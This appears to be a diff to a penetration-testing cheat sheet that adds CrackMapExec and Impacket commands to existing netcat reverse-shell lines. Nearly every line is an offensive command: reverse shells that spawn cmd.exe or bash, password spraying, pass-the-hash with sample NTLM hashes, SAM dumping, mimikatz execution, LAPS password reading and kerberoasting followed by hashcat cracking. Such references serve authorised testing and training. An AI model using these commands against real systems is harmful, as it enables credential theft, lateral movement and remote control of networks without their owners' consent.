@@ -458,6 +458,9 @@ nc -lnvp 4444
 ```powershell
 nc.exe 172.21.24.11 443 -e cmd.exe
 nc 172.21.23.100 443 -e /bin/bash
+
+##CRACKMAPEXEC
+
 crackmapexec smb 192.168.1.101 -u user1 user2 user3 -p Summer18
 crackmapexec smb 192.168.1.101 -u user1 -p password1 password2 password3
 crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'whoami'
@@ -468,6 +471,17 @@ crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sam
 crackmapexec smb -L
 crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz
 crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='privilege::debug'
+crackmapexec smb 192.168.1.1 -d zoro.gold.local -k -u bonclay -p Ocotober2022
+export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache / smb zoro.gold.local --use-kcache
+crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
+crackmapexec smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
+crackmapexec smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
+crackmapexec smb <ip> -u user-can-read-laps -p pass --laps
+crackmapexec smb <ip> -u 'user' -p 'pass' -M spooler
+crackmapexec ldap 192.168.0.104 -u harry -p pass --kerberoasting / hashcat -m13100 output.txt wordlist.txt
+
+##IMPACKET
+
 python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
 pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$
 python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
